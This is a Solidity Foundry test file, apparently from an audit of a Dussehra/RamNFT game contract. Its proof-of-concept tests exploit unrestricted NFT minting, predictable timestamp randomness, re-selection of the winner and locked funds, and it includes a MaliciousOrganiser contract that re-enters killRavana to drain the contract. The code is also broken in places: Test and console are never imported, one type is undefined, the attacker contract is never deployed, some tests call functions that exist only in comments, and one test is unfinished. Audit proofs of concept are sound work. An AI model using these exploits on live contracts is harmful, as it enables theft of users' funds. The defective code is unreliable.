// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Dussehra} from "../../src/Dussehra.sol";
import {ChoosingRam} from "../../src/ChoosingRam.sol";
import {RamNFT} from "../../src/RamNFT.sol";

contract CounterTest is Test {
    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    mock cheatCodes = mock(VM_ADDRESS);
    address public organiser = makeAddr("organiser");
    address public player1 = makeAddr("player1");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");
    address public player4 = makeAddr("player4");

    MaliciousOrganiser maliciousOrganiser;

    function setUp() public {
        // uncomment below code to test reentrancy by malicious organiser
        // maliciousOrganiser = new MaliciousOrganiser(address(dussehra));
        // vm.startPrank(address(maliciousOrganiser));

        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }

    modifier participants() {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        _;
    }

    function test__isRamSelectedValueIsFalseByDefault() public {
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));

        assertEq(choosingRam.isRamSelected(), false);
    }

    // error ChoosingRam__RamIsSelected();
    // error ChoosingRam__NotOrganiser();

    // modifier RamIsNotSelectedCustom() {
    //     if (!isRamSelected) {
    //         revert ChoosingRam__RamIsSelected();
    //     }
    //     _;
    // }

    // modifier OnlyOrganiserCustom() {
    //     if (ramNFT.organiser() == msg.sender) {
    //         revert ChoosingRam__NotOrganiser();
    //     }
    //     _;
    // }

    // function selectRamIfNotSelectedCustom() public RamIsNotSelectedCustom OnlyOrganiserCustom {
    //     if (block.timestamp < 1728691200) {
    //         revert ChoosingRam__TimeToBeLikeRamIsNotFinish();
    //     }
    //     if (block.timestamp > 1728777600) {
    //         revert ChoosingRam__EventIsFinished();
    //     }

    //     uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
    //     selectedRam = ramNFT.getCharacteristics(random).ram;
    //     isRamSelected = true;
    // }

    // place above code in ChoosingRam.sol and test it here using below test case otherwise it will throw error
    // the above code is just a way to show that custom errors cost less gas than require statements with long strings
    function test__GasCostIsLowForCustomErrors() public {
        vm.txGasPrice(1);

        uint256 gasStart = gasleft();

        vm.expectRevert();
        choosingRam.selectRamIfNotSelected();

        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the long string errors", gasUsedFirst);

        uint256 gasStartCustom = gasleft();

        vm.expectRevert();
        choosingRam.selectRamIfNotSelectedCustom();

        uint256 gasEndCustom = gasleft();
        uint256 gasUsedCustom = (gasStartCustom - gasEndCustom) * tx.gasprice;
        console.log("Gas cost of custom errors", gasUsedCustom);

        assert(gasUsedFirst > gasUsedCustom);
    }

    function test__AnyoneCanMintDirectly() public {
        vm.startPrank(player1);
        ramNFT.mintRamNFT(player1); // mint NFT directly without paying 1 ether via `Dussehra.sol`
        vm.stopPrank();

        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.getCharacteristics(0).ram, player1);

        vm.startPrank(player1);
        ramNFT.mintRamNFT(player2); // can mint n number of NFT's directly without paying entranceFee via `Dussehra.sol` to anyone
        vm.stopPrank();

        assertEq(ramNFT.ownerOf(1), player2);
        assertEq(ramNFT.getCharacteristics(1).ram, player2);

        assertEq(ramNFT.getNextTokenId(), 2);
    }

    function test__manipulateTimestamp() public participants {
        assertEq(ramNFT.ownerOf(0), player1); //player1 owns the token 0

        vm.warp(1728691198 + 1); // executing the transaction exactly at a particular timestamp to get a predictable outcome of 0
        vm.startPrank(player1);
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;
        vm.stopPrank();

        assertEq(random, 0);
        assertEq(ramNFT.getCharacteristics(random).ram, player1);

        assertEq(ramNFT.getCharacteristics(random).isJitaKrodhah, false); // isJitaKrodhah is false initially

        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1); // executed with predictable random value
        vm.stopPrank();

        assertEq(ramNFT.getCharacteristics(random).isJitaKrodhah, true); // updated the value of isJitaKrodhah to true in favor of caller/miner
    }

    function test__anyoneCanWinAndWithdrawWithoutPayingFee() public participants {
        assertEq(address(dussehra).balance, 2 ether); // two players entered the game and now protocol has 2 ether

        vm.startPrank(player3);
        ramNFT.mintRamNFT(player3); // attacker mints NFT directly from RamNFT::mintRamNFT() without paying entranceFee
        vm.stopPrank();

        vm.warp(1728691200 + 1); // Now, time passed and no one is selected as Ram
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();

        assertEq(random, 2);
        assertEq(ramNFT.getCharacteristics(random).ram, player3);

        // so organiser calls function to choose one randomly
        // possibly, organiser can enter game and choose his token id predictably
        // also miner can submit transaction in a block that can benifit him by picking his NFT as winner
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        assertEq(choosingRam.isRamSelected(), true);

        vm.startPrank(player3);
        dussehra.killRavana(); // player3 will be chosen as winner and kills ram
        vm.stopPrank();

        uint256 RamwinningAmount = dussehra.totalAmountGivenToRam();
        assertEq(RamwinningAmount, 1 ether);

        vm.startPrank(player3);
        dussehra.withdraw(); // player3 despite paying fee, wins and withdraws amount
        vm.stopPrank();

        assertEq(ramNFT.getCharacteristics(random).ram.balance, RamwinningAmount);
    }

    function test__RamCanBeChangedAfterSelection() public participants {
        vm.warp(1728691198 + 1); // executing the transaction exactly at a particular timestamp to get a predictable outcome of 0 for simplicity
        vm.startPrank(player1);
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;
        vm.stopPrank();

        assertEq(random, 0);
        assertEq(ramNFT.getCharacteristics(random).ram, player1);
        vm.startPrank(player1);

        for (uint64 i = 0; i < 5; i++) {
            choosingRam.increaseValuesOfParticipants(0, 1); // lets assume player 1 is selected as ram
        }

        vm.stopPrank();

        assertEq(choosingRam.selectedRam(), player1); // selected ram is player 1
        assertEq(choosingRam.isRamSelected(), false);

        vm.warp(1728691199 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); // though player 1 is already selected, organiser can again call this function to change the selected ram to another player
        vm.stopPrank();

        assertEq(choosingRam.isRamSelected(), true);
        assertNotEq(choosingRam.selectedRam(), player1); // now, selected ram is not player 1
    }

    // function increaseValuesOfParticipants_Simplified(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyParticipant)
    //     public
    //     RamIsNotSelected
    // {
    //     if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
    //         revert ChoosingRam__InvalidTokenIdOfChallenger();
    //     }
    //     if (tokenIdOfAnyParticipant > ramNFT.tokenCounter()) {
    //         revert ChoosingRam__InvalidTokenIdOfPerticipent();
    //     }
    //     if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
    //         revert ChoosingRam__CallerIsNotChallenger();
    //     }

    //     if (block.timestamp > 1728691200) {
    //         revert ChoosingRam__TimeToBeLikeRamFinish();
    //     }

    //     uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;

    //     uint256 tokenId = random == 0 ? tokenIdOfChallenger : tokenIdOfAnyParticipant;
    //     RamNFT.CharacteristicsOfRam memory characteristics = ramNFT.getCharacteristics(tokenId);

    //     if (!characteristics.isJitaKrodhah) {
    //         ramNFT.updateCharacteristics(tokenId, true, false, false, false, false);
    //     } else if (!characteristics.isDhyutimaan) {
    //         ramNFT.updateCharacteristics(tokenId, true, true, false, false, false);
    //     } else if (!characteristics.isVidvaan) {
    //         ramNFT.updateCharacteristics(tokenId, true, true, true, false, false);
    //     } else if (!characteristics.isAatmavan) {
    //         ramNFT.updateCharacteristics(tokenId, true, true, true, true, false);
    //     } else if (!characteristics.isSatyavaakyah) {
    //         ramNFT.updateCharacteristics(tokenId, true, true, true, true, true);
    //         selectedRam = characteristics.ram;
    //     }
    // }

    // place above code in ChoosingRam.sol and test it here using below test case otherwise it will throw error
    // the above code is just a way to show that simplified code can save gas
    function test__gasCostSimplified() public participants {
        vm.txGasPrice(1);

        uint256 gasStart = gasleft();

        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);

        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of complex if-else statements", gasUsedFirst);

        uint256 gasStartCustom = gasleft();

        vm.startPrank(player2);
        choosingRam.increaseValuesOfParticipants_Simplified(1, 0);

        uint256 gasEndCustom = gasleft();
        uint256 gasUsedCustom = (gasStartCustom - gasEndCustom) * tx.gasprice;
        console.log("Gas cost of simplified if-else", gasUsedCustom);

        assert(gasUsedFirst > gasUsedCustom);
    }

    function test__fundsLocked() public participants {
        vm.warp(1728777600 + 1); // 2 participants are already there with event finished

        vm.expectRevert();
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); // selecting ram after event ends is not possible
        vm.stopPrank();

        vm.expectRevert();
        dussehra.killRavana(); // killing ravana after event ends is not possible

        vm.expectRevert();
        dussehra.withdraw(); // withdrawing after event ends is not possible

        assertEq(address(dussehra).balance, 2 ether); // funds are locked
    }

    function test__ReentrancyForKillRavana() public participants {
        assertEq(address(dussehra).balance, 2 ether); // two players entered the game and now protocol has 2 ether

        vm.startPrank(player3);
        vm.deal(player3, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        uint256 dussehraInitialBalance = address(dussehra).balance;

        vm.deal(address(maliciousOrganiser), 1 ether);

        vm.startPrank(address(maliciousOrganiser));
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        vm.warp(1728691201);

        vm.startPrank(address(maliciousOrganiser));
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.startPrank(address(maliciousOrganiser));
        dussehra.killRavana();
        vm.stopPrank();

        assert(address(dussehra).balance < 1.5 ether);
        // assertEq(address(maliciousOrganiser).balance, dussehraInitialBalance);
    }

    function test__ReentrancyWithdrawal() public participants {
        vm.startPrank(player3);
        vm.deal(player3, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
    }
}

contract MaliciousOrganiser {
    Dussehra dussehra;
    address s_dussehra;

    constructor(address _dussehra) {
        s_dussehra = _dussehra;
        dussehra = Dussehra(s_dussehra);
    }

    receive() external payable {
        console.log(address(msg.sender).balance);
        if (address(msg.sender).balance != 0 ether) dussehra.killRavana();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}
